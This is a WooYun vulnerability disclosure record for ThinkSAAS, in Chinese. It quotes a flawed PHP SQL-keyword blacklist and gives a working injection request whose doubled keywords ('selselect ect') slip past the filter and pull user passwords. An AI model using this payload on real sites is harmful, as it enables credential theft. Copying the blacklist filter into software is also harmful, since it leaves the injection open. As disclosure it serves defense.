{"id": 3697, "wybug_id": "wooyun-2014-053361", "wybug_title": "ThinkSAAS最新版绕过过滤继续注入", "wybug_corp": "thinksaas.cn", "wybug_author": "xfkxfk", "wybug_date": "2014-03-11 13:34", "wybug_open_date": "2014-06-09 13:35", "wybug_type": "SQL注射漏洞", "wybug_level": "高", "wybug_rank_0": "20", "wybug_status": "厂商已经确认", "wybug_from": "http://www.wooyun.org", "wybug_tags": ["第三方不可信程序", "源码审核", "注射漏洞利用技巧", "源码分析", "白盒测试"], "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2014-03-11：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2014-03-11：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2014-03-14：\t细节向第三方安全合作伙伴开放\t\t\t\t\t\t\t\t\t2014-05-05：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2014-05-15：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2014-05-25：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2014-06-09：\t细节向公众公开  简要描述： ThinkSAAS最新版绕过过滤继续注入。无gpc限制，无需登录认证。  详细说明：  旧版本分析如下： WooYun: ThinkSAAS SQL注入#6 在新版本里进行了两处修复：第一处修复，文件\\app\\tag\\action\\add.php：\ncase \"do\":\t\t\t$objname = tsFilter($_POST['objname']);\t\t$idname = tsFilter($_POST['idname']);\t\t$objid = intval($_POST['objid']);\t\t$tags = t($_POST['tags']);\t\t\t\t$new['tag']->addTag($objname,$idname,$objid,$tags);\t\t\t\ttsNotice('标签添加成功！');\t\t\tbreak;\n把之前的t函数换成了tsFilter函数。第二处修复，文件\\thinksaas\\tsApp.php：\nforeach ( $row as $key => $value ) {                        $value = $this->escape ( $value );                        //$vals [] = \"`$key` = $value\";                        $vals [] = \"{$key} = {$value}\";\n对$value变量进行了escape过滤添加了新的构造sql语句的赋值语句但是这种修补我们依然可以进行注入。来看看tsFilter函数：\nfunction tsFilter($value){        $value = trim($value);        //定义不允许提交的SQl命令和关键字        $words = array();        $words[] = \"add \";        $words[] = \"and \";        $words[] = \"count \";        $words[] = \"order \";        $words[] = \"table \";        $words[] = \"by \";        $words[] = \"create \";        $words[] = \"delete \";        $words[] = \"drop \";        $words[] = \"from \";        $words[] = \"grant \";        $words[] = \"insert \";        $words[] = \"select \";        $words[] = \"truncate \";        $words[] = \"update \";        $words[] = \"use \";        $words[] = \"--\";        $words[] = \"#\";        $words[] = \"group_concat\";        $words[] = \"column_name\";        $words[] = \"information_schema.columns\";        $words[] = \"table_schema\";        $words[] = \"union \";        $words[] = \"where \";        $words[] = \"alert\";        $value = strtolower($value);//转换为小写        foreach($words as $word){                if(strstr($value,$word)){                        $value = str_replace($word,'',$value);                }        }                return $value;}\n这个很容易的就可以看出，诸如将“select”改为“selselect ect”,就可以绕过过滤。所以最终可以注入出数据的exp为：EXP：\n链接：http://localhost/thinksaas/index.php?app=tag&ac=add&ts=dopost：objname=article=1, tagname=(selselect ect pwd frofrom m ts_user limit 0,1), count_group&idname=1&objid=1&tags=111111\n\n\n\n\n   漏洞证明：  见详细说明   修复方案：  严格过滤   版权声明：转载请注明来源 xfkxfk@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：高 漏洞Rank：20  确认时间：2014-03-11 13:51 厂商回复： 感谢提交，正在修复 最新状态： 暂无  ", "replys": "漏洞评价：\n评论\n     2014-03-11 13:51 |    \t\tThinkSAAS(乌云厂商)\t\t \n  好吧，又要加班了，还是白帽子厉害。。。    \n  \n\n\n", "wybug_level_fromcorp": "高", "wybug_rank_fromcorp": 20, "Ranks": null}